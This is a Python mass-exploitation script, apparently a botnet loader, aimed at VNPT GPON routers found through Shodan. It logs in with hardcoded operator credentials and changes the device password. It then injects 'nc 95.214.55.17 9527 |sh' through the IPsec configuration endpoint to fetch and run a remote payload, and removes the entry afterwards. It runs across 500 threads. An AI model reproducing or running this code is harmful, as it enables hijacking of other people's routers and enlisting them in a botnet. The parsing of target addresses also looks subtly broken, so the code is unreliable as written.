import requests, sys, os, time, datetime 
from multiprocessing.pool import ThreadPool 
from threading import Thread 
 
uaheaders = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:98.0) Gecko/20100101 Firefox/98.0"} 
command = "nc 95.214.55.17 9527 |sh" # ip if loading server 
connections, verified, execs = 0,0,0 
 
def statistics(): 
  try: 
    while True: 
      print(f"[{datetime.datetime.now().time()}] Connections: {connections} | Verified: {verified} | Execs {execs}") 
      time.sleep(2) 
  except: 
    pass 
 
def basicverify(ip, port) -> bool: 
  global connections, verified 
  try: 
    r = requests.get(f"http://{ip}:{port}/", headers=uaheaders, timeout=10) 
    connections += 1 
    if len(str(r.headers)) == 122 and "pcPassword2" in r.text: 
      verified += 1 
      return True 
    return False 
  except Exception as e: 
    #print(f"Error {e} in basicverify()") 
    pass 
 
def attemptchange(ip, port): 
  try: 
    pwheaders = {"Content-Type": "application/x-www-form-urlencoded","Cookie":"Authorization=Basic b3BlcmF0b3IgTjN0MUBiR0BZ"} 
    r = requests.get(f"http://{ip}:{port}/password.html", headers=pwheaders, timeout=10) 
    sessionkey = r.text.split("name=\"sessionKey\" value=\"")[1].split("\"")[0] 
    pwdata = f"sessionKey={sessionkey}&inUserName=operator&inOrgPassword=Passwd2@&inPassword=N3t1@bG@Y&pwdCfm=N3t1@bG@Y" 
    requests.post(f"http://{ip}:{port}/password.cgi", headers=pwheaders, data=pwdata, timeout=10) 
  except: 
    
    pass 
 
def getcrypt(ip, port): 
  try: 
    r = requests.get(f"http://{ip}:{port}/main.html", headers={"Cookie":"Authorization=Basic b3BlcmF0b3IgTjN0MUBiR0BZ"}, timeout=10) 
    cryptcookie = r.headers['Set-Cookie'] 
    return cryptcookie 
  except Exception as e: 
    pass 
 
def authprocedure(data): 
  try: 
    data = data.strip()
    ip = data[0] 
    port = '80'
    if basicverify(ip, port): 
      attemptchange(ip, port) 
      exploit(ip, port) 
  except Exception as e: 
    pass 
 
def getlist(): 
  try: 
    if os.path.exists("gpon.list"): 
      if input("Overwrite gpon.list? (y/n): ") == "y": 
        os.remove("gpon.list") 
      else: 
        exit() 
    os.system("shodan download --limit -1 gpon 'http.html_hash:840397575'") 
    os.system("gzip -d gpon.json.gz; shodan parse gpon.json --fields=ip_str,port > gpon.list; rm gpon.json") 
    print("Data has been saved to gpon.list") 
  except Exception as e: 
    pass 
 
def exploit(ip, port): 
  global execs 
  try: 
    cryptcookie = getcrypt(ip, port) 
    authheaders = {"Authorization":"Basic b3BlcmF0b3IgTjN0MUBiR0BZ"} 
    r = requests.get(f"http://{ip}:{port}/ipsconfig.html", headers=authheaders, timeout=10) 
    sessiontoken = r.text.split("'&sessionKey=")[1].split("';")[0] 
   
    requests.get(f"http://{ip}:{port}/ipsec.cmd?action=add&ipsTableIndex=0&ipsConnName=1&ipsConnName=1&ipsIpver=4&ipsLocalGwIf=veip0.1&ipsTunMode=esp&ipsRemoteMask=255.255.255.0&ipsRemoteMode=gwAddress&ipsRemoteGWAddr=1.2.3.4&ipsRemoteDomain=&ipsLocalIPMode=single&ipsLocalIP=1.2.3.4&ipsLocalMask=255.255.255.0&ipsRemoteIPMode=single&ipsRemoteIP=`{command}`&ipsRemoteMask=255.255.255.0&ipsKeyExM=auto&ipsAuthM=pre_shared_key&ipsPSK=key&ipsCertificateName=&ipsPerfectFSEn=disable&ipsManualEncryptionAlgo=3des-cbc&ipsManualEncryptionKey=&ipsManualAuthAlgo=hmac-md5&ipsManualAuthKey=&ipsSPI=101&ipsPh1Mode=main&ipsPh1EncryptionAlgo=3des&ipsPh1IntegrityAlgo=md5&ipsPh1DHGroup=modp1536&ipsPh1KeyTime=86400&ipsPh2EncryptionAlgo=3des&ipsPh2IntegrityAlgo=hmac_md5&ipsPh2DHGroup=modp1536&ipsPh2KeyTime=43200&sessionKey={sessiontoken}", headers=authheaders, timeout=10) 
    time.sleep(3) 
    r = requests.get(f"http://{ip}:{port}/ipsec.cmd?action=view", headers=authheaders, timeout=10) 
    sessiontoken = r.text.split("'&sessionKey=")[1].split("';")[0] 
    requests.get(f"http://{ip}:{port}/ipsec.cmd?action=remove&rmLst=1&sessionKey={sessiontoken}", headers=authheaders, timeout=10) 
    print(ip,sessiontoken)
    execs += 1 
  except Exception as e: 
    pass 
 
if len(sys.argv) != 2: 
  print(f"~ VNPT GPON LOADER ~\r\nhttps://www.shodan.io/search?query=http.html_hash:840397575\r\n\r\nUsage:\r\n  Loading - python3 {sys.argv[0]} list.txt\r\n  Download list - python3 {sys.argv[0]} down") 
  exit() 
 
if sys.argv[1] == "down":  getlist() 
 
t = Thread(target = statistics).start() 
ips = [line.rstrip('\n') for line in open(sys.argv[1])] 
pool = ThreadPool(500) 
pool.map(authprocedure,ips)
